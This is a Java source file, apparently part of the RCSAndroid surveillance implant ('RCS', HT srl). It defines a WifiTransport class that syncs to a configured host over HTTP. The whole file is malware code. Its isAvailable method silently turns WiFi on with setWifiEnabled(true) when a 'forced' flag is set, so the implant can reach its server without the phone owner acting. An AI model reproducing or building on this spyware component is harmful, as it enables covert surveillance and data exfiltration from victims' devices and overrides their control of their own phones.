/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : WifiTransport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action.sync;

import com.ht.RCSAndroidGUI.Status;

import android.content.Context;
import android.net.wifi.WifiManager;

/**
 * The Class WifiTransport.
 */
public class WifiTransport extends HttpTransport {

	private boolean forced;

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 */
	public WifiTransport(final String host) {
		super(host);

	}

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 * @param wifiForced
	 *            the wifi forced
	 */
	public WifiTransport(final String host, final boolean wifiForced) {
		super(host);
		this.forced = wifiForced;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		String service = Context.WIFI_SERVICE;
		final WifiManager wifi = (WifiManager) Status.getAppContext()
				.getSystemService(service);

		boolean available = wifi.isWifiEnabled();
		if (!wifi.isWifiEnabled()){
			if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING){
				available = wifi.setWifiEnabled(true);
			}
		}
		
		return available;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#getSuffix()
	 */
	@Override
	protected String getSuffix() {
		// TODO
		return "";
	}

}
